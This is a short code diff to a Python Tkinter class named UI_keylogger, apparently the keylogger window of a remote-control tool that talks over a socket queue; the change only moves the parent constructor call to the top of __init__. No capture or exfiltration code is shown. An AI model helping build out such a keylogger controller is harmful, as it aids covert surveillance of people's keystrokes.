@@ -6,11 +6,11 @@ import queue
 
 class UI_keylogger(tk.Toplevel):
     def __init__(self, parent, socket_queue, ui_queues):
+        super().__init__(parent)
         self.ui_queue = queue.Queue()
         self.socket_queue = socket_queue
         ui_queues['keyboard'] = self.ui_queue
 
-        super().__init__(parent)
         self.title = lb.KEYLOGGER_TITLE
         self.protocol("WM_DELETE_WINDOW", self.close)
         self.resizable(False, False)
